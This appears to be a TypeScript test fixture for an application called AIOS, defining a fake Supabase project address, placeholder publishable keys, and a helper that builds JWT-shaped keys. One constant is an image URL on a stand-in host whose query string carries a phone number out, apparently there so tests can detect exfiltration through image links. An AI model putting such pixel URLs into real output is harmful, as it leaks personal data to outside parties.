/** An address outside AIOS whose query carries data out. */
export const OUTSIDE_IMAGE =
  "https://collect.example/pixel.png?d=lead-phone-0501234567";

export const PROJECT_REF = "abcdefghijklmnopqrst";

/** The project's own address, where edge functions write storage links. */
export const PROJECT_ORIGIN = `https://${PROJECT_REF}.supabase.co`;

/**
 * A Supabase publishable key in its JWT shape: the payload names the project.
 * `aud` makes the payload hold both characters base64url writes differently.
 */
export const JWT_PUBLISHABLE_KEY = publishableKey({
  iss: "supabase",
  ref: PROJECT_REF,
  role: "anon",
  aud: "??>>",
});

/** The newer key shape, which names no project. */
export const OPAQUE_PUBLISHABLE_KEY = "sb_publishable_not-a-jwt";

/** A JWT-shaped key whose payload is these claims. */
export function publishableKey(claims: object): string {
  const payload = btoa(JSON.stringify(claims))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");

  return `eyJhbGciOiJIUzI1NiJ9.${payload}.signature`;
}
